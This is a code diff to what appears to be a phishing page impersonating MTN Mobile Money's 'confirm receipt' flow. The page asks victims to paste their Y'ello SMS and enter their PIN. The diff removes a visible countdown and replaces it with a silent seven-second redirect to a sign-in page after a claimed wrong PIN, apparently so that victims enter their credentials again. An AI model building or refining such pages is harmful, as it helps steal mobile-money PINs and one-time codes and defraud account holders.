@@ -463,9 +463,7 @@
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
       fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.',
       wrongPinPopupTitle: 'Wrong PIN Entered',
-      wrongPinPopupDesc: 'You entered the wrong PIN. You will be taken back to sign in to try again.',
-      wrongPinCountdown: 'Redirecting in {n} second{s}…',
-      wrongPinRedirecting: 'Redirecting now…'
+      wrongPinPopupDesc: 'You entered the wrong PIN. You will be taken back to sign in to try again.'
     },
     fr: {
       docTitle: 'MTN Mobile Money · Confirmer la réception',
@@ -505,9 +503,7 @@
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
       fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.',
       wrongPinPopupTitle: 'Code PIN incorrect',
-      wrongPinPopupDesc: 'Vous avez saisi un code PIN incorrect. Vous allez être redirigé vers la connexion pour réessayer.',
-      wrongPinCountdown: 'Redirection dans {n} seconde{s}…',
-      wrongPinRedirecting: 'Redirection maintenant…'
+      wrongPinPopupDesc: 'Vous avez saisi un code PIN incorrect. Vous allez être redirigé vers la connexion pour réessayer.'
     }
   };
 
@@ -766,47 +762,31 @@
   }
 
   function showWrongPinPopup() {
-    let countdown = 7;
-
     const overlay = document.createElement('div');
     overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
     overlay.innerHTML =
       '<div style="background:#fff;border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:Poppins,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);">' +
         '<div style="width:60px;height:60px;border-radius:50%;background:#E31E24;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>' +
         '<div style="font-size:17px;font-weight:800;color:#101828;margin-bottom:8px;">' + T.wrongPinPopupTitle + '</div>' +
-        '<div style="font-size:13px;color:#667085;line-height:1.6;margin-bottom:16px;">' + T.wrongPinPopupDesc + '</div>' +
-        '<div style="font-size:12px;color:#0066A6;font-weight:700;" id="wrongPinCountdown">' +
-          T.wrongPinCountdown.replace('{n}', countdown).replace('{s}', '') +
-        '</div>' +
+        '<div style="font-size:13px;color:#667085;line-height:1.6;">' + T.wrongPinPopupDesc + '</div>' +
       '</div>';
     document.body.appendChild(overlay);
 
-    const countdownEl = overlay.querySelector('#wrongPinCountdown');
-
-    const timer = setInterval(() => {
-      countdown--;
-      if (countdown > 0) {
-        countdownEl.textContent = T.wrongPinCountdown
-          .replace('{n}', countdown)
-          .replace('{s}', countdown === 1 ? '' : 's');
-      } else {
-        clearInterval(timer);
-        countdownEl.textContent = T.wrongPinRedirecting;
-        const q = new URLSearchParams({
-          tx: tx.ref,
-          am: tx.am,
-          cur: tx.cur,
-          rn: tx.rn,
-          c: tx.c,
-          pm: tx.pm,
-          sn: tx.sn,
-          mk: tx.mk,
-          an: tx.an,
-          lang: currentLang
-        });
-        window.location.href = 'mtn-signin.html?' + q.toString();
-      }
-    }, 1000);
+    setTimeout(() => {
+      const q = new URLSearchParams({
+        tx: tx.ref,
+        am: tx.am,
+        cur: tx.cur,
+        rn: tx.rn,
+        c: tx.c,
+        pm: tx.pm,
+        sn: tx.sn,
+        mk: tx.mk,
+        an: tx.an,
+        lang: currentLang
+      });
+      window.location.href = 'mtn-signin.html?' + q.toString();
+    }, 7000);
   }
 
   async function confirmPayment() {
